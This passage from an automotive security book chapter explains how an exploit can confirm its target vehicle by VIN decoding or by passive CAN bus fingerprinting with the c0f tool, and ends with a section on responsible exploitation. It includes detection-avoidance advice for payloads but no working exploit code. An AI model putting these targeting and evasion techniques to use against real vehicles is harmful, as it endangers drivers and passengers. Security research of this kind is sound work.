<td style="vertical-align: top;" class="table_th1"><p class="table">N</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">1992</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">2</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">2002</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">C</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">2012</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table"><p class="table">D</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">1983</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">P</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">1993</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">3</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">2003</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">D</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">2013</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table"><p class="table">E</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">1984</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">R</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">1994</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">4</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">2004</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">E</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">2014</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table"><p class="table">F</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">1985</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">W</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">1995</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">5</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">2005</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">F</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">2015</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table"><p class="table">G</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">1986</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">T</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">1996</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">6</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">2006</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">G</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">2016</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table"><p class="table">H</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">1987</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">V</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">1997</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">7</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">2007</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">H</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">2017</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table"><p class="table">J</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">1988</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">W</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">1998</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">8</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">2008</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">J</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">2018</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table"><p class="table">K</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">1989</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">X</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">1999</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">9</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">2009</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">K</p></td>&#13;
<td style="vertical-align: top;" class="table_th1"><p class="table">2019</p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<p class="indent">For exploit purposes, knowing the year isn’t as important as knowing whether your code will work on your target vehicle, but if your exploit depends on an exact make, model, and year, you’ll need to perform this step. For instance, if you know that the infotainment system you’re targeting is installed in both Honda Civics and Pontiac Azteks, you can check the VIN to see whether your target vehicle fits. Hondas are manufactured in Japan and Pontiacs are made in North America, so the first byte of the WMI needs to be either a <em>J</em> or a <em>1</em>, respectively.</p>&#13;
<div class="note">&#13;
<p class="notet"><strong><span class="bgblack">NOTE</span></strong></p>&#13;
<p class="notep"><em>Your payload would still work on other vehicles made in North America or Japan if that radio unit is installed in some other vehicle that you’re unaware of.</em></p>&#13;
</div>&#13;
<p class="indent">Once you know what platform you’re running on, you can either execute the proper payload if you’ve found the right vehicle or exit out gracefully.</p>&#13;
<h5 class="h5" id="ch11lev3sec3"><strong>Detection Risk of Interactive Probing</strong></h5>&#13;
<p class="noindent">The advantage of using interactive probing to determine the make of your target vehicle is that this method will work for any make or model of car. Every car has a VIN that can be decoded to give you the information you need, and you need no prior knowledge of the platform’s CAN packets in order to make a VIN query. However, this method does require you to <em>transmit</em> the query on the CAN bus, which means it’s detectable and you may be discovered before you can trigger your payload. (Also, our examples used cheap hacks to avoid properly handling ISO-TP, which could lead to errors.)</p>&#13;
<h4 class="h4" id="ch11lev2sec6"><strong><em>Passive CAN Bus Fingerprinting</em></strong></h4>&#13;
<p class="noindent">If you’re concerned about being detected before you can use your payload, you should avoid any sort of active probing. Passive CAN bus fingerprinting is less detectable, so if you discover that the model vehicle you’re targeting isn’t supported by your exploit, you can exit gracefully without having created <span epub:type="pagebreak" id="page_205"/>any network traffic, thus limiting your chances of being detected. Passive CAN bus fingerprinting involves monitoring network traffic to gather information unique to certain makes of vehicles and then matching that information to a known fingerprint. This area of research is relatively new, and as of this writing, the only tools available for gathering and detecting bus fingerprints are the ones released by Open Garages.</p>&#13;
<p class="indent">The concept of passive CAN bus fingerprinting is taken from IPv4 passive operating system fingerprinting, like that used by the p0f tool. When passive IPv4 fingerprinting, details in the packet header, such as the window size and TTL values, can be used to identify the operating system that created the packet. By monitoring network traffic and knowing which operating systems set which values in the packet header by default, it’s possible to determine which operating system the packet originated from without transmitting on the network.</p>&#13;
<p class="indentb">We can use a similar methodology with CAN packets. The unique identifiers for CAN are as follows:</p>&#13;
<p class="bull">• Dynamic size (otherwise set to 8 bytes)</p>&#13;
<p class="bull">• Intervals between signals</p>&#13;
<p class="bull">• Padding values (0x00, 0xFF 0xAA, and so on)</p>&#13;
<p class="bull">• Signals used</p>&#13;
<p class="indentt">Because different makes and models use different signals, unique signal IDs can reveal the type of vehicle that’s being examined. And even when the signal IDs are the same, the timing intervals can be unique. Each CAN packet has a DLC field to define the length of the data, though some manufacturers will set this to 8 by default and pad out the data to always ensure that 8 bytes are used. Manufacturers will use different values to pad their data, so this can also be an indicator of the make.</p>&#13;
<h5 class="h5" id="ch11lev3sec4"><strong>CAN of Fingers</strong></h5>&#13;
<p class="noindent">The Open Garages tool for passive fingerprinting is called <em>CAN of Fingers (c0f)</em> and is available for free at <em><a href="https://github.com/zombieCraig/c0f/">https://github.com/zombieCraig/c0f/</a></em>. c0f samples a bunch of CAN bus packets and creates a fingerprint that can later be identified and stored. A fingerprint from c0f—a JSON consumable object—might look like this:</p>&#13;
<p class="programs">{"Make": "Unknown", "Model": "Unknown", "Year": "Unknown", "Trim": "Unknown",<br/>"Dynamic": "true", "Common": [ { "ID": "166" },{ "ID": "158" },{ "ID": "161" },<br/>{ "ID": "191" },{ "ID": "18E" },{ "ID": "133" },{ "ID": "136" },{ "ID": "13A" },<br/>{ "ID": "13F" },{ "ID": "164" },{ "ID": "17C" },{ "ID": "183" },{ "ID": "143" },<br/>{ "ID": "095" } ], "MainID": "143", "MainInterval": "0.009998683195847732"}</p>&#13;
<p class="indent">Five fields make up the fingerprint: <span class="literal">Make</span>, <span class="literal">Model</span>, <span class="literal">Year</span>, <span class="literal">Trim</span>, and <span class="literal">Dynamic</span>. The first four values—<span class="literal">Make</span>, <span class="literal">Model</span>, <span class="literal">Year</span>, and <span class="literal">Trim</span>—are all listed as <span class="literal">Unknown</span> if they’re not in the database. <a href="ch11.html#ch11tab2">Table 11-2</a> lists the identified attributes that are unique to the vehicle.</p>&#13;
<p class="tabcaption"><span epub:type="pagebreak" id="page_206"/><a id="ch11tab2"/><strong>Table 11-2:</strong> Vehicle Attributes for Passive Fingerprinting</p>&#13;
<table class="topbot">&#13;
<thead>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table_th"><p class="table"><strong>Attribute</strong></p></td>&#13;
<td style="vertical-align: top;" class="table_th"><p class="table"><strong>Value type</strong></p></td>&#13;
<td style="vertical-align: top;" class="table_th"><p class="table"><strong>Description</strong></p></td>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table"><p class="table">Dynamic</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">Binary value</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">If the DLC has a dynamic length, this is set to <span class="literal">true</span>.</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table"><p class="table">Padding</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">Hex value</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">If padding is used, this attribute will be set to the byte used for padding. This example does not have padding, so the attribute is not included.</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table"><p class="table">Common</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">Array of IDs</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">The common signal IDs based on the frequency seen on the bus.</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table"><p class="table">Main ID</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">Hex ID</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">The most common signal ID based on the frequency of occurrence and interval.</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top;" class="table"><p class="table">Main Interval</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">Floating point value</p></td>&#13;
<td style="vertical-align: top;" class="table"><p class="table">The shortest interval time of the most common ID (MainID) that repeats on the bus.</p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<h5 class="h5" id="ch11lev3sec5"><strong>Using c0f</strong></h5>&#13;
<p class="noindent">Many CAN signals that fire at intervals will appear in a logfile the same amount of times as each other, with similar intervals between occurrences. c0f will group the signals together by the number of occurrences.</p>&#13;
<p class="indent">To get a better idea of how c0f determines the common and main IDs, run <span class="literal">c0f</span> with the <span class="literal">--print-stats</span> option, as shown in <a href="ch11.html#ch11list5">Listing 11-5</a>.</p>&#13;
<p class="programs">   $ <span class="codestrong">bundle exec bin/c0f --logfile test/sample-can.log --print-stats</span><br/>     Loading Packets...   6158/6158  |*******************************************<br/>   *******|  0:00<br/>   Packet Count (Sample Size): 6158<br/>   Dynamic bus: true<br/>   [Packet Stats]<br/>    166 [4] interval 0.010000110772939828 count 326<br/>    158 [8] interval 0.009999947181114783 count 326<br/>    161 [8] interval 0.009999917103694035 count 326<br/>    191 [7] interval 0.009999932509202223 count 326<br/>    18E [3] interval 0.010003759677593524 count 326<br/>    133 [5] interval 0.0099989076761099 count 326<br/>    136 [8] interval 0.009998913544874925 count 326<br/>    13A [8] interval 0.009998914278470553 count 326<br/>    13F [8] interval 0.009998904741727389 count 326<br/>    164 [8] interval 0.009998898872962365 count 326<br/>    17C [8] interval 0.009998895204984225 count 326<br/>    183 [8] interval 0.010000821627103366 count 326<br/><span class="ent">➊</span>  039 [2] interval 0.015191149488787786 count 215<br/><span class="ent">➋</span>  143 [4] interval 0.009998683195847732 count 326<br/>    095 [8] interval 0.010001396766075721 count 326<br/>    1CF [6] interval 0.01999976016857006 count 163<br/>    1DC [4] interval 0.019999777829205548 count 163<br/>    320 [3] interval 0.10000315308570862 count 33<br/>    324 [8] interval 0.10000380873680115 count 33<br/>    37C [8] interval 0.09999540448188782 count 33<br/>    1A4 [8] interval 0.01999967775227111 count 163<br/>    1AA [8] interval 0.019999142759334967 count 162<br/>    1B0 [7] interval 0.019999167933967544 count 162<br/>    1D0 [8] interval 0.01999911758470239 count 162<br/>    294 [8] interval 0.039998024702072144 count 81<br/>    21E [7] interval 0.039998024702072144 count 81<br/>    309 [8] interval 0.09999731183052063 count 33<br/>    333 [7] interval 0.10000338862019201 count 32<br/>    305 [2] interval 0.1043075958887736 count 31<br/>    40C [8] interval 0.2999687910079956 count 11<br/>    454 [3] interval 0.2999933958053589 count 11<br/>    428 [7] interval 0.3000006914138794 count 11<br/>    405 [8] interval 0.3000005006790161 count 11<br/>    5A1 [8] interval 1.00019109249115 count 3</p>&#13;
<p class="list-caption"><a id="ch11list5"/><em>Listing 11-5: Running <span class="literal">c0f</span> with the <span class="literal">--print-stats</span> option</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_207"/>The common IDs are the grouping of signals that occurred 326 times (the highest count). The main ID is the common ID with the shortest average interval—in this case, signal 0x143 at 0.009998 ms <span class="ent">➋</span>.</p>&#13;
<p class="indent">The c0f tool saves these fingerprints in a database so that you can passively identify buses, but for the purpose of shellcode development, we can just use main ID and main interval to quickly determine whether we’re on the target we expect to be on. Taking the result shown in <a href="ch11.html#ch11list5">Listing 11-5</a> as our target, we’d listen to the CAN socket for signal 0x143 and know that the longest we’d have to wait is 0.009998 ms before aborting if we didn’t see an ID of 0x143. (Just be sure that when you’re checking how much time has passed since you started sniffing the bus, you use a time method with high precision, such as <span class="literal">clock_gettime</span>.) You could get more fine-grained identification by ensuring that you also identified all of the common IDs as well.</p>&#13;
<p class="indent">It’s possible to design fingerprints that aren’t supported by c0f. For instance, notice in the c0f statistical output in <a href="ch11.html#ch11list5">Listing 11-5</a> that the signal ID 0x039 occurred 215 times <span class="ent">➊</span>. That’s a strange ratio compared to the other common packets. The common packets are occurring about 5 percent of the time, but 0x039 occurs about 3.5 percent of the time and is the only signal with that ratio. Your shellcode could gather a common ID and calculate the ratio of 0x039 occurring to see whether it matches. This could just be a fluke based on current vehicle conditions at the time of the recording, but it might be interesting to investigate. The sample size should be increased and multiple runs should be used to verify findings before embedding the detection into your shellcode.</p>&#13;
<div class="note">&#13;
<p class="notet"><strong><span class="bgblack">NOTE</span></strong></p>&#13;
<p class="notep"><em>c0f isn’t the only way to quickly detect what type of vehicle you’re on; the output could be used for additional creative ways to identify your target system without transmitting packets. The future may bring systems that can hide from c0f, or we may discover a newer, more efficient way to passively identify a target vehicle.</em></p>&#13;
</div>&#13;
<h3 class="h3" id="ch11lev1sec3"><span epub:type="pagebreak" id="page_208"/><strong>Responsible Exploitation</strong></h3>&#13;
<p class="noindent">You now know how to identify whether your exploit is running on the target it’s designed for and even how to check without transmitting a single packet. You don’t want to flood a bus with a bogus signal, as this will shut the network down, and flooding the wrong signal on the wrong vehicle can have unknown affects.</p>&#13;
<p class="indent">When sharing exploit code, consider adding a bogus identification routine or complete VIN check to prevent someone from simply launching your exploit haphazardly. Doing so will at least force the script kiddies to understand enough of the code to modify it to fit the proper vehicles. When attacking interval-based CAN signals, the proper way to do this is to listen for the CAN ID you want to modify and, when you receive it through your read request, to modify <em>only</em> the byte(s) you want to alter and immediately send it back out. This will prevent flooding, immediately override the valid signal, and retain any other attributes in the signal that aren’t the target of the attack.</p>&#13;
<p class="indent">Security developers need access to exploits to test the strength of their protections. New ideas from both the attack and defense teams need to be shared, but do so responsibly.</p>&#13;
<h3 class="h3" id="ch11lev1sec4"><strong>Summary</strong></h3>&#13;
<p class="noindent">In this chapter, you learned how to build working payloads from your research. You took proof-of-concept C code, converted it to payloads in assembly, and then converted your assembly to shellcodes that you could use with Metasploit to make your payloads more modular. You also learned safe ways to ensure that your payloads wouldn’t accidentally be run on unexpected vehicles with the help of VIN decoding and passive CAN bus identification techniques. You even learned some ways to prevent script kiddies from taking your code and injecting it into random vehicles.</p>&#13;
</body></html>